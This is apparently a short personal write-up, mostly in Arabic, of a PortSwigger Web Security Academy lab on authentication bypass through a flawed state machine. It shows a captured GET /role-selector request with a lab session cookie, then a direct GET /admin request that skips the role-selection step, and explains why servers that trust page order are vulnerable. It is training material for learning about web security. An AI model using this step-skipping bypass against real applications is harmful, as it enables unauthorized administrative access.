# GET /role-selectorLab : Authentication bypass via flawed state machine

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine

- الفكره من الLab ده انه عاوزما معمل تخطي للauthentication بس في مشكله في flawed state machine او معناه ان ممكن اروح علي اي endpoint من غير ما الserver يعمل check او تعدي علي اي صفحه قبلها ذي هنا المقروض كان في صفحه لاختيار الrole بس مقسومه علي مرتين ممكن في المره الاولي ان هي مفيهاش اي info  اخليها تعمل direct في الheader علي صفحه الadmin وهي مش هتعمل تحقيق

 

```bash
1. GET /role-selector HTTP/2
Host: 0a13005b04cb9cbc81d9bb410045000b.web-security-academy.net
Cookie: session=frzyRxKBf6Iy2XI8TbTiaQsD61bfAtWh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a13005b04cb9cbc81d9bb410045000b.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

2. GET /admin HTTP/2
```

الـ**flawed state machine** ممكن تظهر لو:

- السيرفر بيعتمد بس على "إنك وصلت لصفحة الـ2FA" (يعني الافتراض إن "لو الـUI وداك للصفحة دي يبقى أنت عديت الخطوة اللي قبلها")، من غير ما يتحقق فعليًا في كل request إن الخطوة الأولى اتعملت بنجاح.
- فتقدر توجه نفسك مباشرة (direct request) لصفحة/endpoint الخطوة الأخيرة، من غير ما تعدي اللي قبلها أصلاً.
